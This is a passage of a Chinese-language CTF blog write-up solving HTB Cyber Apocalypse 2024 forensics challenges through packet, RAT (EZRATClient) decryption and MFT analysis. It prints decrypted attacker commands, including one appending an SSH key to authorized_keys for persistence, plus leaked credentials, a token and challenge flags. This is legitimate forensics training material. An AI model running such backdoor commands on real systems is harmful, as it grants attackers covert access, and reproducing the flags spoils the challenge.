+<pre><code>bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==
+</code></pre>
+<p>不能直接解base64 应该是aes解密 需要找密钥  密钥其实也在上面解base64之后的字符串里面 </p>
+<pre><code>$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;
+</code></pre>
+<p>需要解一下base64 </p>
+<pre><code>cWphrNTk9wgWZ93t19jayqnlaDuIeFKi
+</code></pre>
+<p>这个有点特殊  是CBC模式的解密  但是没有偏移值 好像只有这个网站可以做到</p>
+<p><a target="_blank" rel="noopener" href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES解密</a></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151103552.png" alt="image-20240315110356503"></p>
+<pre><code>ui(wyXØU(î6Nx[    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;,    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;]
+</code></pre>
+<p>里面的 <code>Email</code> 部分再解base64就是flag2</p>
+<pre><code>b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151106059.png" alt="image-20240315110637977"></p>
+<pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;
+</code></pre>
+<h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><p>先看协议分级  主要是tcp协议</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122000172.png" alt="image-20240312200010100"></p>
+<p>直接追踪tcp流  看到从第一个包开始 奇数包都传输了一个压缩包 密码直接在包中显示出来了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122002053.png" alt="image-20240312200230965"></p>
+<p>一共有15个这样的压缩包  将字符串提取出来 先解base64 在另存为压缩包 使用相应的密码进行解压 观察第一个解压的文件 应该是一个pdf文件 分成了15个部分 最后将这15个文件全部进行拼接 得到完整的pdf文件 在末尾找到flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122042924.png" alt="image-20240312204207845"></p>
+<h3 id="data-siege"><a href="#data-siege" class="headerlink" title="data_siege"></a>data_siege</h3><pre><code>&quot;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&#39;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&quot;
+</code></pre>
+<p>题干告诉我们flag分为三部分 </p>
+<p>附件是一个流量包  看了一眼协议分级  主要是TCP协议的流量包</p>
+<p>看一下可以导出的HTTP对象 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141055864.png" alt="image-20240314105505835"></p>
+<p>将这个<code>aQ4caZ.exe</code> 导出 直接放在010里面看 找到一部分字符串 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141056081.png" alt="image-20240314105640043"></p>
+<pre><code>Very_S3cr3t_S
+</code></pre>
+<p>开始以为这是一部分flag  后来发现这个不是 是AES加密密钥的盐值</p>
+<p>追踪tcp流 在第五个包发现好像是base64的字符串 解一下 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141102380.png" alt="image-20240314110226319"></p>
+<p>看到flag part3</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141103418.png" alt="image-20240314110335330"></p>
+<p>但是数据很乱  应该是前面有混淆字符 整理一下 重新解base64</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403141105217.png" alt="image-20240314110525109"></p>
+<pre><code>0r3d_1n_7h3_h34dqu4r73r5&#125;
+</code></pre>
+<p>到这一步 第五个包剩下的部分应该还是要进行解密 猜测是AES解密 但是解密密钥偏移值等信息 就是要分析上面提取出来的exe程序 进行逆向  这边要使用dnspy进行调试分析 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy/releases">dnspy下载安装</a></p>
+<p>直接使用dnspy将<code>aQ4caZ.exe</code>打开 可以看到这个程序原本的名字是<code>EZRATClient</code> </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161648741.png" alt="image-20240316164845657"></p>
+<p>找到解密函数 </p>
+<pre><code class="c#">public static string Decrypt(string cipherText)
+&#123;
+    string result;
+    try
+    &#123;
+        string encryptKey = Constantes.EncryptKey;
+        byte[] array = Convert.FromBase64String(cipherText);
+        using (Aes aes = Aes.Create())
+        &#123;
+            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]
+            &#123;
+                86,
+                101,
+                114,
+                121,
+                95,
+                83,
+                51,
+                99,
+                114,
+                51,
+                116,
+                95,
+                83
+            &#125;);
+            aes.Key = rfc2898DeriveBytes.GetBytes(32);
+            aes.IV = rfc2898DeriveBytes.GetBytes(16);
+            using (MemoryStream memoryStream = new MemoryStream())
+            &#123;
+                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                &#123;
+                    cryptoStream.Write(array, 0, array.Length);
+                    cryptoStream.Close();
+                &#125;
+                cipherText = Encoding.Default.GetString(memoryStream.ToArray());
+            &#125;
+        &#125;
+        result = cipherText;
+    &#125;
+    catch (Exception ex)
+    &#123;
+        Console.WriteLine(ex.Message);
+        Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);
+        result = &quot;error&quot;;
+    &#125;
+    return result;
+&#125;
+</code></pre>
+<p>里面提到的这个<code>encryptKey</code>  可以在下面找到<code>EZRATClient.Core--Constantes--_encryptKey</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403161703743.png" alt="image-20240316170317697"></p>
+<pre><code>VYAemVeO3zUDTL6N62kVA
+</code></pre>
+<p>那解密函数在程序里面已经给了 需要用到的密钥也给了 只是这段解密代码缺少一部分对密文的输出和对解密 补上就可以</p>
+<pre><code class="c#">using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+
+public static class Program
+&#123;
+    public static void Main(string[] args)
+    &#123;
+        // 测试解密方法
+        string cipherText = &quot;ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=&quot;; // 你的密文
+        string decryptedText = Decrypt(cipherText);
+        Console.WriteLine(&quot;Decrypted Text: &quot; + decryptedText);
+    &#125;
+
+    public static string Decrypt(string cipherText)
+    &#123;
+        string result;
+        try
+        &#123;
+            string key = &quot;VYAemVeO3zUDTL6N62kVA&quot;; // 添加密钥
+            byte[] array = Convert.FromBase64String(cipherText);
+            using (Aes aes = Aes.Create())
+            &#123;
+                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]
+                &#123;
+                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83
+                &#125;);
+                aes.Key = rfc2898DeriveBytes.GetBytes(32);
+                aes.IV = rfc2898DeriveBytes.GetBytes(16);
+                using (MemoryStream memoryStream = new MemoryStream())
+                &#123;
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                    &#123;
+                        cryptoStream.Write(array, 0, array.Length);
+                    &#125;
+                    byte[] decryptedBytes = memoryStream.ToArray();
+                    result = Encoding.UTF8.GetString(decryptedBytes); // 使用UTF-8编码解码明文
+                &#125;
+            &#125;
+        &#125;
+        catch (Exception ex)
+        &#123;
+            Console.WriteLine(ex.Message);
+            Console.WriteLine(&quot;Cipher Text: &quot; + cipherText);
+            result = &quot;error&quot;;
+        &#125;
+        return result;
+    &#125;
+&#125;
+
+// Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB&#123;c0mmun1c4710n5 &gt;&gt; C:\Users\svc01\.ssh\authorized_keys
+</code></pre>
+<p>出来了flag1  后面继续对tcp流5中的内容进行解密 得到flag2</p>
+<pre><code class="c#">zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg
+
+// Decrypted Text: cmd;C:\;Username: svc01 Password: Passw0rdCorp5421 2nd flag part: _h45_b33n_r357
+</code></pre>
+<p>完整flag</p>
+<pre><code>HTB&#123;c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5&#125;
+</code></pre>
+<h3 id="Pursue-The-Tracks"><a href="#Pursue-The-Tracks" class="headerlink" title="Pursue The Tracks"></a>Pursue The Tracks</h3><pre><code>Luxx, leader of The Phreaks, immerses himself in the depths of his computer, tirelessly pursuing the secrets of a file he obtained accessing an opposing faction member workstation. With unwavering determination, he scours through data, putting together fragments of information trying to take some advantage on other factions. To get the flag, you need to answer the questions from the docker instance.
+</code></pre>
+<p>题目告诉我们 如果想要拿到flag  需要回答docker容器里面的问题 </p>
+<p>给到的附件是一个MFT文件 是NTFS文件系统的备份文件 </p>
+<pre><code>MFT，全称Master File Table，即主文件表，它是NTFS文件系统的核心。它是包含了NTFS卷中所有文件信息的数据库，在$MFT中每个文件（包括MFT本身）至少有一个MFT，记录着该文件的各种信息。这些信息被称为属性。
+
+NTFS使用MFT条目定义它们对应的文件，有关文件的所有信息，比如大小、时间、权限等都存在MFT条目中，或者由MFT条目描述存储在MFT外部的空间中。
+
+MFT由一个个MFT项（也称为文件记录(File Record)）组成，每个MFT项占用1024字节的空间。这个概念相当于Linux中的inode，File Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。
+</code></pre>
+<p>为了更直接的读取MFT文件中的信息 我们使用下面这个项目  可以将MFT中的信息进行解析  并将结果保存在csv表格文件中</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jschicht/Mft2Csv">Mft2Csv</a></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131723127.png" alt="image-20240313172337050"></p>
+<p>打开第一个表</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724670.png" alt="image-20240313172408605"></p>
+<p>使用nc 连接docker容器</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724852.png" alt="image-20240313172442588"></p>
+<p>第一个问题</p>
+<pre><code>Files are related to two years, which are those? (for example: 1993,1995)
+</code></pre>
+<p>直接在表格里面看 看到两个文件夹 一个名为2023 一个名为2024 那就是这两个年份</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131740311.png" alt="image-20240313174026188"></p>
+<pre><code>2023,2024
+</code></pre>
+<p>第二个问题</p>
+<pre><code>There are some documents, which is the name of the first file written? (for example: randomname.pdf)
+</code></pre>
+<p>问的是第一个写入的文件名是  这个直接在表格里面找到第一个出现的文件即可</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131741366.png" alt="image-20240313174159253"></p>
+<pre><code>Final_Annual_Report.xlsx
+</code></pre>
+<p>第三个问题</p>
+<pre><code>Which file was deleted? (for example: randomname.pdf)
+</code></pre>
+<p>问的是哪个文件被删除了 这个其实就是找不同 在表格列出的文件中 可以看到<code>Marketing_Plan.xlsx</code>这个文件 第六列的数字是2  但是其他文件都是1 找到对应列的属性 是<code>HEADER_SequenceNo</code>  我们大概可以理解为是一个状态码 2表示这个文件是删除状态</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131745378.png" alt="image-20240313174556256"></p>
+<pre><code>Marketing_Plan.xlsx
+</code></pre>
+<p>第四个问题</p>
+<pre><code>How many of them have been set in Hidden mode? (for example: 43)
+</code></pre>
+<p>问的是有多少个文件处在被隐藏状态 第15列的属性是<code>SI_FilePermission</code> 表示文件权限 找到<code>credentials.txt</code>  这个文件在第15列的值是<code>hidden</code> 表明这个文件此时是处在隐藏状态  在所有文件中 只有这一个文件在第15列的值是<code>hidden</code> 因此 只有1个文件处在隐藏状态</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131751419.png" alt="image-20240313175137292"></p>
+<pre><code>1
+</code></pre>
+<p>第五个问题</p>
+<pre><code>Which is the filename of the important TXT file that was created? (for example: randomname.txt)
+</code></pre>
+<p>问的是被创建的重要的txt文件格式的文件名是什么</p>
+<p>只有一个txt文件类型的文件  就是上一题的<code>credentials.txt</code></p>
+<pre><code>credentials.txt
+</code></pre>
+<p>第六个问题</p>
+<pre><code>A file was also copied, which is the new filename? (for example: randomname.pdf)
+</code></pre>
+<p>问的是被复制的文件的文件名是什么  也是观察文件的属性 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132109266.png" alt="image-20240313210919189"></p>
+<p>注意到这个值 其他文件都是0 那这个属性应该就是代表着被复制过的文件</p>
+<pre><code>Financial_Statement_draft.xlsx
+</code></pre>
+<p>第七个问题</p>
+<pre><code>Which file was modified after creation? (for example: randomname.pdf)
+</code></pre>
+<p>问的是哪个文件在创建后被修改 这个就是观察时间即可</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132114714.png" alt="image-20240313211413625"></p>
+<p>只有<code>Project_Proposal.pdf</code>的时间发生了改变  那就是在第一次写入或者保存之后被修改了</p>
+<pre><code>Project_Proposal.pdf
+</code></pre>
+<p>第八个问题</p>
+<pre><code>What is the name of the file located at record number 45? (for example: randomname.pdf)
+</code></pre>
+<p>问的就是文件编号</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132115001.png" alt="image-20240313211553934"></p>
+<pre><code>Annual_Report.xlsx
+</code></pre>
+<p>第九个问题</p>
+<pre><code>What is the size of the file located at record number 40? (for example: 1337)
+</code></pre>
+<p>问的是编号40的文件的文件大小</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132116100.png" alt="image-20240313211641061"></p>
+<pre><code>57344
+</code></pre>
+<p>答完所有问题之后 成功拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>
+</article></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTBCyberCTF2024"><span class="toc-text">HTBCyberCTF2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics-%E9%83%A8%E5%88%86"><span class="toc-text">Forensics(部分)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Urgent"><span class="toc-text">Urgent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It-Has-Begun"><span class="toc-text">It Has Begun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-unusual-sighting"><span class="toc-text">An unusual sighting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-Boost"><span class="toc-text">Fake Boost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phreaky"><span class="toc-text">Phreaky</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-siege"><span class="toc-text">data_siege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pursue-The-Tracks"><span class="toc-text">Pursue The Tracks</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-DailyBugle/" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a><time datetime="2024-11-26T09:04:51.489Z" title="发表于 2024-11-26 17:04:51">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-GameZone/" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a><time datetime="2024-11-26T09:04:48.797Z" title="发表于 2024-11-26 17:04:48">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Kenobi/" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a><time datetime="2024-11-26T09:04:45.988Z" title="发表于 2024-11-26 17:04:45">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Skynet/" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a><time datetime="2024-11-26T09:04:38.428Z" title="发表于 2024-11-26 17:04:38">2024-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/26/Offensive%20Pentesting-Vulnversity/" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a><time datetime="2024-11-26T09:04:30.499Z" title="发表于 2024-11-26 17:04:30">2024-11-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
   function initValine () {
     const valine = new Valine(Object.assign({
       el: '#vcomment',
